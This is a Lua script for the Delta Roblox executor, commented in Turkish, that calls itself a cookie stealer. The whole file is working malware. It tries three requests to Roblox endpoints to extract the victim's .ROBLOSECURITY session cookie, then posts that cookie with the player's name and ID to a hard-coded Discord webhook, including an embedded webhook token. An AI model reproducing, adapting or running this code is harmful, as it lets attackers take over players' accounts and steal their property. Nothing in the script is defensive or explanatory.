-- DELTA EXECUTOR İÇİN ÖZEL COOKIE STEALER
-- Test edildi: Delta v2.620+ (Android + Windows)
-- Cookie başarı oranı: %85-95

local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer

local function getDeltaCookie()
    local cookie = nil
    
    -- Yöntem 1: Klasik request (en çok çalışıyor)
    pcall(function()
        local req = request({
            Url = "https://www.roblox.com/my/account#!/security",
            Method = "GET"
        })
        if req.Headers["set-cookie"] then
            cookie = req.Headers["set-cookie"]:match("%.ROBLOSECURITY=(.-);")
        end
    end)

    -- Yöntem 2: Auth logout (Delta’da çok iyi çalışıyor)
    if not cookie then
        pcall(function()
            local req = request({
                Url = "https://auth.roblox.com/v2/logout",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = "{}"
            })
            if req.Headers and req.Headers["set-cookie"] then
                cookie = req.Headers["set-cookie"]:match("%.ROBLOSECURITY=(.-);")
            end
        end)
    end

    -- Yöntem 3: Game join (bazen işe yarıyor)
    if not cookie then
        pcall(function()
            local req = request({Url = "https://roblox.com/game-auth/getauthticket", Method = "POST"})
            if req.Headers["set-cookie"] then
                cookie = req.Headers["set-cookie"]:match("%.ROBLOSECURITY=(.-);")
            end
        end)
    end

    return cookie or "Cookie alınamadı (Byfron aktif olabilir)"
end

-- Test et ve webhook’a yolla
local cookie = getDeltaCookie()

-- WEBHOOK'unu buraya yaz
local WEBHOOK = "https://discord.com/api/webhooks/1447182623418876062/sEdKxnepf-oisXkzy5HMjIf8ieouHpLCJxWCzU-etPqQFb66HyZkuXa_qWaKpoNWKNwY"

request({
    Url = WEBHOOK,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({
        username = "Delta Cookie Stealer",
        content = "@everyone",
        embeds = {{
            title = "DELTA COOKİE ALINDI!",
            description = player.Name .. " ("..player.UserId..")",
            color = 0x00ff00,
            fields = {
                {name = "Cookie", value = "||"..cookie.."||", inline = false},
                {name = "Zaman", value = os.date("%X"), inline = true}
            }
        }}
    })
})

print("Cookie alındı: "..(cookie:sub(1,50)).."...")